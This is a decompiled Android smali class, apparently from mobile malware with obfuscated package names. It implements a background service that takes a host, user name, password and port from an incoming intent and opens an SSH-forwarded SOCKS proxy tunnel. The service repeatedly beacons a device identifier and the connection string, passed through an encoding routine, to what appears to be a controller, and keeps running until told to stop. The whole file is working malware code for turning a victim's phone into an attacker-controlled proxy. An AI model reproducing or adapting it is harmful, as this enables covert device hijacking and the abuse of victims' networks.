.class public Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    const-string v0, "ServiceForwardingTunel"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 12

    iget-object v0, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v1, "socks"

    const-string v2, ""

    invoke-virtual {v0, p0, v1, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "host"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "user"

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v2, "pass"

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v2, "port"

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v9, Ljava/lang/Thread;

    new-instance v2, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel$fddo;

    invoke-direct {v2, p0}, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel$fddo;-><init>(Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;)V

    invoke-direct {v9, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v9}, Ljava/lang/Thread;->start()V

    iget-object v2, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    move-object v3, p0

    move-object v4, v0

    move-object v5, v8

    move-object v7, p1

    invoke-virtual/range {v2 .. v7}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v3, "START"

    const-string v4, "START SOCKS"

    invoke-virtual {v2, v3, v4}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;)V

    :cond_40
    :try_start_40
    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x1f40

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_47
    .catch Ljava/lang/InterruptedException; {:try_start_40 .. :try_end_47} :catch_48

    goto :goto_4c

    :catch_48
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_4c
    iget-object v2, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "p="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v6, p0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "|Working Proxy Server, Connection: ssh -L "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":127.0.0.1:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "@"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "4"

    invoke-virtual {v2, p0, v4, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v2, p0, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v2, p0, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "stop"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_40

    :try_start_aa
    invoke-virtual {v9}, Ljava/lang/Thread;->join()V
    :try_end_ad
    .catch Ljava/lang/Exception; {:try_start_aa .. :try_end_ad} :catch_ad

    :catch_ad
    invoke-virtual {p0}, Landroid/app/IntentService;->stopSelf()V

    return-void
.end method
